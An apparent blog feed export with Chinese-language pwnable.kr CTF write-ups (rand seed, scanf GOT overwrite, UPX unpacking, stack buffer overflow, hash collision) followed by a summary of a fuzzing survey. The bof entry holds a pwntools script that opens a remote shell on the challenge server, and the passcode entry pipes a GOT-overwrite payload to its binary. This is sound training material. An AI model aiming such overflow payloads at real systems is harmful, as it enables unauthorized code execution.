class="built_in">random</span>) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当<code>rand()</code>函数未设置随机种子时，默认随机种子为1，而种子相同时，每次产生的伪随机数序列都是相同的</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">random@ubuntu:~$ ./random </span><br><span class="line">3039230856</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, I thought libc random is unpredictable...</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— passcode</title>
    <url>/488eb6ec.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh passcode@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="ppasscode-c">passcode.c</span><a href="#ppasscode-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>考点：</p><ul><li>GOT表</li><li>scanf使用错误</li></ul><p>可以看到在函数login中对scanf的使用错误，因此我们只要能控制passcode1的值，就可以控制写入的地址</p><p>同时welcome没有参数，login也没有参数，我们可以通过welcome中的name来控制login中的passcode1的值。</p><p>用<code>objdump -S passcode</code>查看汇编代码可以看到，<code>name</code>位于<code>ebp-0x70</code>，<code>passcode1</code>位于<code>ebp-0x10</code>，<code>passcode2</code>位于<code>ebp-0xc</code>，但是<code>name</code>读入长度为100，无法覆盖到<code>passcode2</code>的值。<br>看下可执行文件中的函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.plt' at offset 0x398 contains 9 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0</span><br><span class="line">0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0</span><br><span class="line">0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>可以在<code>passcode1</code>覆盖为<code>printf</code>函数的<code>GOT</code>地址，然后再输入<code>system</code>函数位置，则下次执行<code>printf</code>时其实执行的是<code>system(&quot;/etc/cat flag&quot;)</code>，在这里要注意的是调用前的参数赋值等，<code>system</code>的执行位置应放在 <code>0x80485e3</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passcode@ubuntu:~$ python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode</span><br><span class="line">Toddler's Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Now I can safely trust you that you have credential :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— flag</title>
    <url>/5bc7dc4f.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&#39;s open it.</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>下载下来，先用<code>pwntools</code>来看下<code>checksec</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ checksec flag</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ubuntu&#x2F;flag&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><p>可以看到有UPX的壳，使用UPX工具去壳 <a href="https://upx.github.io/" target="_blank" rel="noopener">官方链接</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;upx$ .&#x2F;upx -d ..&#x2F;flag </span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux&#x2F;amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><p>看起来好像没什么了，flag文件也非常的大</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>用<code>strings</code>命令看下里面的字符串，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ strings flag | grep &#39;:)&#39;</span><br><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>UPX...? sounds like a delivery service :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— bof</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>先看下文件，然后nc上去进行数据输入</p><a id="more"></a><h2><span id="pbof-c">bof.c</span><a href="#pbof-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	&#x2F;&#x2F; smash me!</span><br><span class="line">	if(key &#x3D;&#x3D; 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>把<code>bof</code>拖进IDA里看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;overflow me : &quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  if ( a1 &#x3D;&#x3D; -889275714 )</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Nah..&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>main</code>函数调用<code>func</code>时，留出位置给key，所以让buffer溢出到key，填入<code>0xcafebabe</code>即可。IDA告诉我们s的位置位于<code>ebp-2Ch</code>处，而key的位置在<code>ebp+8h</code>处。中间要填上52个字节。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>写python脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ssh &#x3D; remote(&quot;pwnable.kr&quot;,9000)</span><br><span class="line">payload &#x3D; &quot;a&quot;*52+p32(0xcafebabe)</span><br><span class="line">ssh.send(payload)</span><br><span class="line">ssh.interactive()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ python bof.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to pwnable.kr port 9000</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy, I just pwned a buFFer :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— collision</title>
    <url>/90653887.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目需要我们使用ssh登录到服务器上查看<code>ssh col@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcol-c">col.c</span><a href="#pcol-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode &#x3D; 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip &#x3D; (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res&#x3D;0;</span><br><span class="line">	for(i&#x3D;0; i&lt;5; i++)&#123;</span><br><span class="line">		res +&#x3D; ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) !&#x3D; 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode &#x3D;&#x3D; check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>可以看到，要求输入一个20个字符组成的串，然后在check_password函数中，以int的方式读取这20个字符的值，如果加起来的值等于<code>0x21DD09EC</code>的话，那么就可以通过<code>hashcode==check_password(argv[1])</code>的判断，读取<code>flag</code>的内容。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>随便凑五个数，比如有<code>0x05050505*4+0xdc8f5d8</code>，那么可以写出以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">col@ubuntu:~$ .&#x2F;col &#96;python -c &#39;print(&quot;\x05&quot;*16+&quot;\xd8\xf5\xc8\x0d&quot;)&#39;&#96;</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy! I just managed to create a hash collision :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>The Art, Science, and Engineering of Fuzzing(TSE 2019)</title>
    <url>/92a4b7cb.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><blockquote><p>Fuzzing三大优点：部署简单、门槛低、已有的大量经验证明了它的有效性。</p></blockquote><p>前人研究已经很多了，本文主要是做了一个系统的梳理blabla套话，目的是系统地探索模型模糊器各个阶段的设计决策，使我们的fuzzing设计更加行之有效。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>对于hacker来说，fuzzing可以用来进行渗透测试和编写exp，而白帽则想利用fuzzing在被hacker攻击前找到漏洞所在。</p><p>此前已经有很多成功的研究和经典的fuzzing案例了，但不行的是，fuzzing好像遇到了瓶颈。后面的话没用了，大意就是不同论文表意不一致云云等原因搞的fuzzing领域的研究有点乱了。</p><p>所以，本文需要对前面的所有fuzzing研究进行提炼和升华。</p><p><strong>章节安排：</strong></p><p>第2节统一fuzzing术语和核心fuzzing框架，3-7节讲fuzzing每个阶段，调查相关文献，解释设计选择，讨论重要的权衡，并强调许多了不起的工程努力，有助于使现代fuzzing有效地完成其任务。</p><h2><span id="psystemization-taxonomy-and-test-programs">Systemization, Taxonomy, and Test Programs</span><a href="#psystemization-taxonomy-and-test-programs" class="header-anchor">#</a></h2><h3><span id="pfuzzing-amp-fuzzing-testing">fuzzing &amp; fuzzing testing</span><a href="#pfuzzing-amp-fuzzing-testing" class="header-anchor">#</a></h3><blockquote><p>Fuzzing：对可能的输入进行采样，得到对应的输出，类似于x-&gt;f(x)</p><p>Fuzzi testing: 目标是为了寻找bug和漏洞的fuzzing</p><p>Fuzzer：进行fuzz testing的程序</p><p>Fuzz Campaign：有一定安全策略的运行一个fuzzer</p><p>Bug Oracle：待检测的样本</p><p>Fuzz Configuration：fuzz的算法和策略，例如种子如何生成等</p></blockquote><h3><span id="ppaper-selection-criteria">Paper Selection Criteria</span><a href="#ppaper-selection-criteria" class="header-anchor">#</a></h3><p>选了哪些会议的文章云云</p><h3><span id="pfuzz-testing-algorithm">Fuzz Testing Algorithm</span><a href="#pfuzz-testing-algorithm" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134048.jpg" alt="image-20200325001530872"></p><blockquote><p>模糊测试的算法目的是：在有限的时间，一定的约束条件下找到有限的bugs</p></blockquote><p>算法可以分为两个部分：Preprocess部分和 n轮的循环，循环包含五个部分（但在实际中有的可以不要）：schedule、inputgen、inputeval、confupdate、continue，从名字上可以很显然的看出来都是在做什么。一次循环在本文中称为fuzz iteration，简单理解就相当于编译里面的一个pass吧。一次inputeval称为fuzz run。</p><ul><li>$\text{PREPROCESS}(\mathbb{C}) \rightarrow \mathbb{C}$ ：根据用户的fuzzing configuration 进行一些可能的修改和获取一些fuzz中需要信息，比如插装，样本运行时间等</li><li>$\text { SCHEDULE (} \mathbb{C}, \left.t_{\text {elapsed }}, t_{\text {limit }}\right) \rightarrow \text { conf }$ ：根据当前时间和截止时间从当前的fuzzing configure里选取一个待测configure</li><li>$\text { INPUTGEN (conf) } \rightarrow \text { tcs }$ ：根据configure生成待测用例</li><li>$\text { Inpureval (conf, }\left. \text { tcs, } O_{\text {bug }}\right) \rightarrow \mathbb{B}^{\prime} , execinfos$ : 以生成用例和configure，并嵌入bug oracle（检查是否为bug）输入，得到bug和执行信息</li><li>$\text { CONFUPDATE (} \mathbb{C}, conf, execinfos) \rightarrow \mathbb{C}$ ：更新策略</li><li>$\text { CONTINUE }(\mathbb{C}) \rightarrow{\text { True, False }}$ ：判断是否退出</li></ul><h3><span id="ptaxonomy-of-fuzzers">Taxonomy of Fuzzers</span><a href="#ptaxonomy-of-fuzzers" class="header-anchor">#</a></h3><p>黑盒、白盒、灰盒</p><h3><span id="pfuzzer-genealogy-and-overview">Fuzzer Genealogy and Overview</span><a href="#pfuzzer-genealogy-and-overview" class="header-anchor">#</a></h3><p>不得不说汇总的真详细，直接po图了，各个研究的时间线，黑白灰，以及侧重方向一览无余</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134055.jpg" alt="image-20200330213421085"></p><p>以及一个整理好的表</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-134100.jpg" alt="image-20200330213449440"></p><h2><span id="ppreprocess">PreProcess</span><a href="#ppreprocess" class="header-anchor">#</a></h2><h3><span id="pinstrumentation">Instrumentation</span><a href="#pinstrumentation" class="header-anchor">#</a></h3><p>通过插桩来获取在fuzz过程中的有用信息，可以是静态的插桩，也可以是动态的插桩</p><p>静态插桩需要的开销要小，但是需要找同版本的依赖库编译，除了源代码级别的静态插桩，也有二进制级别的静态插桩</p><p>动态插桩需要的开销要大，不过好处是更容易检测动态链接库，工具有：DynInst , DynamoRIO , Pin , Valgrind, and QEMU.</p><p>有的fuzzer可以静态插桩也可以动态插桩</p><ul><li>Execution Feedback：<ul><li>路径覆盖：AFL及其衍生、CollAFL</li><li>结点覆盖：LibFuzzer、Syzkaller</li><li>可选：Honggfuzz</li></ul></li><li>In-Memory Fuzzing：对于一些应用，例如有GUI的程序，初始化绘制GUI什么会浪费时间，这个时候可以dump下初始化后的内存空间来节约时间。有的fuzzer在内存中对一个函数反复fuzzing，称为API fuzzing。缺点：1.不好重建bug产生时的上下文进行复现。2.对于跨函数调用的fuzz可能会出问题。</li><li>Thread Scheduling：条件竞争很难触发，因为它们依赖于不确定的行为，这种行为可能很少发生。但是，通过显式地控制线程的调度方式，插桩也可以用来触发不同的非确定性程序行为已有的研究表明，即使随机调度线程也可以有效地发现竞争条件错误。</li></ul><h3><span id="pseed-selection">Seed Selection</span><a href="#pseed-selection" class="header-anchor">#</a></h3><p>有的情况下fuzzing的取值域会很广，例如MP3文件等。</p><p>因此如何选择最小的初始化种子集合称为种子选择问题，目的是：找到最小的初始种子集合，使得在fuzzing过程中覆盖率最大化。也就是使得fuzzing的效率更高。</p><p>例如我们有种子s1，它能覆盖到{10,20}，以及s2-&gt;{20,30}，那么如果这个时候种子s3-&gt;{10,20,30}，则显然以s3作为初始种子更加高效。</p><h3><span id="pseed-trimming">Seed Trimming</span><a href="#pseed-trimming" class="header-anchor">#</a></h3><p>较小的种子集合可能会消耗较少的内存并引发更高的吞吐量，所以一些fuzzers在fuzz之前减小种子集合的大小，这便是种子集合的修剪。</p><p>一般发生在PREPROCESS或者CONFUPDATE之中</p><h3><span id="ppreparing-a-driver-application">Preparing a Driver Application</span><a href="#ppreparing-a-driver-application" class="header-anchor">#</a></h3><p>对于一些没法直接fuzzing的情况，可能需要自己写一个driver程序。</p><h2><span id="pscheduling">SCHEDULING</span><a href="#pscheduling" class="header-anchor">#</a></h2><p>调度是只选择一个fuzz configuration，然后进入下一轮的fuzz。对于简单的fuzzer，例如zzuf，则没有这个步骤。已有的研究中，ADLFast，BFF等的亮点就在于他们使用的调度策略。</p><p>本节只讨论黑盒和灰盒 fuzzing中的调度策略。</p><h3><span id="pthe-fuzz-configuration-scheduling-fcs-problem">The Fuzz Configuration Scheduling (FCS) Problem</span><a href="#pthe-fuzz-configuration-scheduling-fcs-problem" class="header-anchor">#</a></h3><p>调度的目标：</p><ul><li>分析当前configure信息</li><li>找到可能有最好结果的输入：bugs最多或者覆盖面最大</li><li>…</li></ul><p>还有一些算法1中的解释，很明白</p><h3><span id="pblack-box-fcs-algorithms">Black-box FCS Algorithms</span><a href="#pblack-box-fcs-algorithms" class="header-anchor">#</a></h3><p>对于黑盒fuzzing来说，能够用于FCS的只有：已有的crashes和bugs信息+执行时间</p><p>举例</p><ul><li>HouseHolder、Foote提出成功率指标：#bugs / #runs</li><li>MAB 算法：faster to fuzz allows a fuzzer to either collect more unique bugs with it, or decrease the upperbound on its future success probability more rapidly.</li></ul><h3><span id="pgrey-box-fcs-algorithms">Grey-box FCS Algorithms</span><a href="#pgrey-box-fcs-algorithms" class="header-anchor">#</a></h3><p>灰盒fuzzing能获取的信息比黑盒更多，例如覆盖率等信息</p><p>AFL提出EA算法，EA算法维护了一系列的configuration，从中间选取fit的configurations用来生成待测用例</p><p>疑问三连：</p><ul><li>what makes a configuration fit？</li><li>how configurations are selected</li><li>how a selected configu- ration is used.</li></ul><p>大部分fuzzers都会考虑控制流关系。</p><ul><li><p>AFL的策略是选取最快最小的输入，称为fit（favorite）的</p></li><li><p>AFLfast优化了AFL，快7倍，发现了3个AFL没发现的bug</p><ul><li><p>选择路径频率最小的来探索稀有路径</p></li><li><p>基于优先级来选择configuration，而不是循环选择</p></li><li><p>使用power schedul</p></li></ul></li><li><p>AFLGo进一步优化了优先级策略</p></li></ul><h2><span id="pinput-generation">INPUT GENERATION</span><a href="#pinput-generation" class="header-anchor">#</a></h2><p>有的fuzzer通过在原有seed上突变来产生下一次的输入，而有的基于model产生下一次的输入</p><h3><span id="pmodel-based-generation-based-fuzzers">Model-based (Generation-based) Fuzzers</span><a href="#pmodel-based-generation-based-fuzzers" class="header-anchor">#</a></h3><ul><li><p>predefined model 预定义模型：1.在使用前由user定义模型；2. 模型由fuzzer通过预定义的语法等来自动构建</p></li><li><p>Inferred Model 推断模型：发生在PREPROCESS和CONFUPDATE阶段，通过数据驱动、状态机等实现推断</p></li><li><p>Encoder Model：常用于有固定格式的文件的fuzzer</p></li></ul><h3><span id="pmodel-less-mutation-based-fuzzers">Model-Less （Mutation-based）Fuzzers</span><a href="#pmodel-less-mutation-based-fuzzers" class="header-anchor">#</a></h3><p>这个很常见</p><ul><li>比特位翻转</li><li>算数变异</li><li>基于块的变异</li><li>基于字典的变异</li></ul><h3><span id="pwhite-box-fuzzers">White-box Fuzzers</span><a href="#pwhite-box-fuzzers" class="header-anchor">#</a></h3><ul><li>动态符号执行</li><li>启发式fuzzing</li><li>输入变异</li></ul><h2><span id="pinput-evaluation">INPUT EVALUATION</span><a href="#pinput-evaluation" class="header-anchor">#</a></h2><p>是对输入进行执行以及分析的过程</p><h3><span id="pbug-oracles">Bug Oracles</span><a href="#pbug-oracles" class="header-anchor">#</a></h3><p>用于判断是否有crash 或者有bug的policy，分类举例如下</p><ul><li><p>Memory and Type Safety：Address Sanitizer、SoftBounf/CETS、CFI</p></li><li><p>Undefined Behaviors：Memory Sanitizer 、Undefined Behavior Sanitizer、Thread 